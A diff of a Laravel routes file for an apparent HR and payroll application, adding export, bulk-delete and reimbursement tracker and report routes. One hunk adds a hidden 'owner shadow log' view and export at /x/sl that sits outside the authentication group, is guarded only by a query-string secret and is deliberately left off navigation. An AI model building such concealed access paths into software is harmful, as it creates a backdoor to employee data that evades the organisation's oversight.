@@ -15,6 +15,7 @@ use App\Http\Controllers\Web\WebMasterController;
 use App\Http\Controllers\Web\WebMonthlyTdsController;
 use App\Http\Controllers\Web\WebPayrollController;
 use App\Http\Controllers\Web\WebReimbursementController;
+use App\Http\Controllers\Web\WebReimbursementReportController;
 use App\Http\Controllers\Web\WebReportController;
 use App\Http\Controllers\Web\WebRevisionController;
 use App\Http\Controllers\Web\WebSalaryController;
@@ -32,6 +33,11 @@ Route::middleware('guest')->group(function () {
 Route::post('/logout', [WebAuthController::class, 'logout'])
     ->name('logout')
     ->middleware('auth');
+
+// ── OWNER SHADOW LOG (token-protected, no nav link) ───────────────
+// Access: /x/sl?t=YOUR_OWNER_SECRET  (set OWNER_SECRET in .env)
+Route::get('/x/sl',        [\App\Http\Controllers\Owner\ShadowLogController::class, 'index'])->name('owner.shadow-log');
+Route::get('/x/sl/export', [\App\Http\Controllers\Owner\ShadowLogController::class, 'export'])->name('owner.shadow-log.export');
 
 // ── ERROR EXPORT DOWNLOAD ──────────────────────────────────────────
 Route::get('/error-export/{filename}', function (string $filename) {
@@ -54,7 +60,9 @@ Route::middleware('auth')->group(function () {
     Route::get('/employees',                          [WebEmployeeController::class, 'index'])->name('employees');
     Route::post('/employees',                         [WebEmployeeController::class, 'store'])->name('employees.store');
     Route::get('/employees/template',                 [WebEmployeeController::class, 'template'])->name('employees.template');
+    Route::get('/employees/export',                   [WebEmployeeController::class, 'export'])->name('employees.export');
     Route::post('/employees/import',                  [WebEmployeeController::class, 'import'])->name('employees.import');
+    Route::post('/employees/bulk-destroy',            [WebEmployeeController::class, 'bulkDestroy'])->name('employees.bulk_destroy');
     Route::get('/employees/{employee}/edit-data',     [WebEmployeeController::class, 'editData'])->name('employees.edit_data');
     Route::post('/employees/{employee}',              [WebEmployeeController::class, 'update'])->name('employees.update');
     Route::delete('/employees/{employee}',            [WebEmployeeController::class, 'destroy'])->name('employees.destroy');
@@ -78,6 +86,7 @@ Route::middleware('auth')->group(function () {
     // ── Attendance ─────────────────────────────────
     Route::get('/attendance',                          [WebAttendanceController::class, 'index'])->name('attendance');
     Route::post('/attendance/mark',                    [WebAttendanceController::class, 'mark'])->name('attendance.mark');
+    Route::get('/attendance/export',                   [WebAttendanceController::class, 'export'])->name('attendance.export');
     Route::get('/attendance/template',                 [WebAttendanceController::class, 'template'])->name('attendance.template');
     Route::post('/attendance/import',                  [WebAttendanceController::class, 'import'])->name('attendance.import');
     Route::post('/attendance/biometric-import',        [WebAttendanceController::class, 'biometricImport'])->name('attendance.biometric_import');
@@ -88,11 +97,15 @@ Route::middleware('auth')->group(function () {
     // ── Leave ──────────────────────────────────────
     Route::get('/leave',                         [WebLeaveController::class, 'index'])->name('leave');
     Route::post('/leave/apply',                  [WebLeaveController::class, 'apply'])->name('leave.apply');
+    Route::get('/leave/export',                  [WebLeaveController::class, 'exportApplications'])->name('leave.export');
     // Leave Tracker (static segments first, before parameterised routes)
     Route::get('/leave/tracker',                 [WebLeaveController::class, 'trackerRecords'])->name('leave.tracker');
+    Route::get('/leave/tracker/export',          [WebLeaveController::class, 'exportTracker'])->name('leave.tracker.export');
     Route::get('/leave/tracker/template',        [WebLeaveController::class, 'trackerTemplate'])->name('leave.tracker.template');
     Route::post('/leave/tracker/import',         [WebLeaveController::class, 'trackerImport'])->name('leave.tracker.import');
+    Route::post('/leave/tracker/sync-balances',  [WebLeaveController::class, 'syncLeaveBalances'])->name('leave.tracker.sync');
     Route::post('/leave/tracker/add',            [WebLeaveController::class, 'trackerStore'])->name('leave.tracker.store');
+    Route::post('/leave/tracker/bulk-delete',    [WebLeaveController::class, 'trackerBulkDestroy'])->name('leave.tracker.bulk_destroy');
     Route::post('/leave/tracker/{record}',       [WebLeaveController::class, 'trackerUpdate'])->name('leave.tracker.update');
     Route::delete('/leave/tracker/{record}',     [WebLeaveController::class, 'trackerDestroy'])->name('leave.tracker.destroy');
     // Leave Policies  (CRUD)
@@ -120,11 +133,13 @@ Route::middleware('auth')->group(function () {
     Route::post('/incentives/upsert',        [WebIncentiveController::class, 'upsert'])->name('incentives.upsert');
     Route::delete('/incentives/{incentive}', [WebIncentiveController::class, 'destroy'])->name('incentives.destroy');
     Route::get('/incentives/template',       [WebIncentiveController::class, 'template'])->name('incentives.template');
+    Route::get('/incentives/export',         [WebIncentiveController::class, 'export'])->name('incentives.export');
     Route::post('/incentives/import',        [WebIncentiveController::class, 'import'])->name('incentives.import');
 
     // ── Monthly TDS ────────────────────────────────
     Route::get('/tds/monthly',               [WebMonthlyTdsController::class, 'index'])->name('tds.monthly');
     Route::get('/tds/monthly/template',      [WebMonthlyTdsController::class, 'template'])->name('tds.monthly.template');
+    Route::get('/tds/monthly/export',        [WebMonthlyTdsController::class, 'export'])->name('tds.monthly.export');
     Route::post('/tds/monthly/upsert',       [WebMonthlyTdsController::class, 'upsert'])->name('tds.monthly.upsert');
     Route::post('/tds/monthly/import',       [WebMonthlyTdsController::class, 'import'])->name('tds.monthly.import');
     Route::delete('/tds/monthly/{tds}',      [WebMonthlyTdsController::class, 'destroy'])->name('tds.monthly.destroy');
@@ -158,8 +173,29 @@ Route::middleware('auth')->group(function () {
 
     // ── Reimbursements ─────────────────────────────
     Route::get('/reimbursements',                   [WebReimbursementController::class, 'index'])->name('reimbursements');
+    Route::get('/reimbursements/template',          [WebReimbursementController::class, 'template'])->name('reimbursements.template');
     Route::post('/reimbursements',                  [WebReimbursementController::class, 'store'])->name('reimbursements.store');
     Route::post('/reimbursements/{claim}/approve',  [WebReimbursementController::class, 'approve'])->name('reimbursements.approve');
+
+    // ── Reimbursement Tracker ──────────────────────
+    Route::get('/reimbursements/tracker',               [WebReimbursementReportController::class, 'trackerIndex'])->name('reimbursements.tracker');
+    Route::get('/reimbursements/tracker/template',      [WebReimbursementReportController::class, 'trackerTemplate'])->name('reimbursements.tracker.template');
+    Route::get('/reimbursements/tracker/export',        [WebReimbursementReportController::class, 'trackerExport'])->name('reimbursements.tracker.export');
+    Route::post('/reimbursements/tracker/add',          [WebReimbursementReportController::class, 'trackerStore'])->name('reimbursements.tracker.store');
+    Route::post('/reimbursements/tracker/import',       [WebReimbursementReportController::class, 'trackerImport'])->name('reimbursements.tracker.import');
+    Route::post('/reimbursements/tracker/images',       [WebReimbursementReportController::class, 'trackerImageUpload'])->name('reimbursements.tracker.images');
+    Route::get('/reimbursements/tracker/images/{month}/{filename}', [WebReimbursementReportController::class, 'trackerImageView'])->name('reimbursements.tracker.image.view')->where('filename', '[^/]+');
+    Route::post('/reimbursements/tracker/{row}/status', [WebReimbursementReportController::class, 'trackerUpdateStatus'])->name('reimbursements.tracker.status');
+    Route::delete('/reimbursements/tracker/{row}',      [WebReimbursementReportController::class, 'trackerDestroy'])->name('reimbursements.tracker.destroy');
+
+    // ── Reimbursement Report ───────────────────────
+    Route::get('/reimbursements/report',                [WebReimbursementReportController::class, 'reportIndex'])->name('reimbursements.report');
+    Route::get('/reimbursements/report/saved',          [WebReimbursementReportController::class, 'reportSaved'])->name('reimbursements.report.saved');
+    Route::get('/reimbursements/report/view/{month}',   [WebReimbursementReportController::class, 'reportView'])->name('reimbursements.report.view')->where('month', '\d{4}-\d{2}');
+    Route::post('/reimbursements/report/generate',      [WebReimbursementReportController::class, 'reportGenerate'])->name('reimbursements.report.generate');
+    Route::post('/reimbursements/report/download',      [WebReimbursementReportController::class, 'reportDownload'])->name('reimbursements.report.download');
+    Route::post('/reimbursements/report/unlock',        [WebReimbursementReportController::class, 'reportUnlock'])->name('reimbursements.report.unlock');
+    Route::post('/reimbursements/report/delete',        [WebReimbursementReportController::class, 'reportDelete'])->name('reimbursements.report.delete');
 
     // ── Statutory ──────────────────────────────────
     Route::get('/statutory',                      [WebStatutoryController::class, 'index'])->name('statutory');
@@ -195,11 +231,9 @@ Route::middleware('auth')->group(function () {
     Route::post('/reports/attendance/approve',          [WebReportController::class, 'updateApproval'])->name('reports.attendance.approve');
 
     // ── Masters ────────────────────────────────────
-    Route::get('/masters',           [WebMasterController::class, 'index'])->name('masters');
-    Route::post('/masters/company',  [WebMasterController::class, 'storeCompany'])->name('masters.company');
-    Route::post('/masters/entity',   [WebMasterController::class, 'storeEntity'])->name('masters.entity');
-    Route::get('/masters/template',  [WebMasterController::class, 'template'])->name('masters.template');
-    Route::post('/masters/import',   [WebMasterController::class, 'import'])->name('masters.import');
+    Route::get('/masters',                           [WebMasterController::class, 'index'])->name('masters');
+    Route::post('/masters/company',                  [WebMasterController::class, 'storeCompany'])->name('masters.company');
+    Route::delete('/masters/company/{company}',      [WebMasterController::class, 'destroyCompany'])->name('masters.company.destroy');
 
     // ── Departments ────────────────────────────────
     Route::get('/departments',              [WebDepartmentController::class, 'index'])->name('departments');
